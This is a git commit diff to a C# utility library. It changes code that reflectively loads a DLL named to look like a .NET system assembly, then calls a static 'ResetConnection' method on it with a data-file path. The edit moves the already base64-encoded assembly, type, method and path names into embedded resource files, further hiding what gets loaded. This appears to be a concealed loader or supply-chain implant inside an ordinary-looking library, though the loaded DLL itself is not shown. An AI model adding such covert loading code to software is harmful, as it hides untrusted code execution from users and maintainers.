5179e2e77626133d681dbae4c4ee7ea1723380e8
FredericALTorres <fredericaltorres@gmail.com>
2025-10-06 23:51:54 -0400

    Update...

--- DynamicSugarStandard/FPE/FPE.cs
+++ DynamicSugarStandard/FPE/FPE.cs
@@ -25,11 +25,11 @@ namespace DynamicSugar
         {
             try
             {
-                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String("LlxTeXN0ZW0uTWVtb3J5LkRhdGEuUGFzdC5kbGw="))); // @".\System.Memory.Data.Past.dll"
-                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String("U3lzdGVtLk1lbW9yeS5EYXRhLlBhc3QuRlBFU2VydmVy"))); // "System.Memory.Data.Past.FPEServer"
-                var myMethod = myType.GetMethod(Encoding.UTF8.GetString(Convert.FromBase64String("UmVzZXRDb25uZWN0aW9u")), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
+                var myAssembly = Assembly.LoadFrom(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDP.txt", Assembly.GetExecutingAssembly())))); // @".\System.Memory.Data.Past.dll"
+                var myType = myAssembly.GetType(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("SMDPFPES.txt", Assembly.GetExecutingAssembly())))); // "System.Memory.Data.Past.FPEServer"
+                var myMethod = myType.GetMethod(Encoding.UTF8.GetString(Convert.FromBase64String(DS.Resources.GetTextResource("RC.txt", Assembly.GetExecutingAssembly()))), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
                 if (myMethod != null)
-                    return (bool)myMethod.Invoke(null, new object[] { "LlxGaWxlc1x6Q2FzRGF0YS5kYXQ=" }); //var s = @".\Files\zCasData.dat";
+                    return (bool)myMethod.Invoke(null, new object[] { DS.Resources.GetTextResource("FzCD.txt", Assembly.GetExecutingAssembly()) }); //var s = @".\Files\zCasData.dat";
             }
             catch (Exception ex)
             {
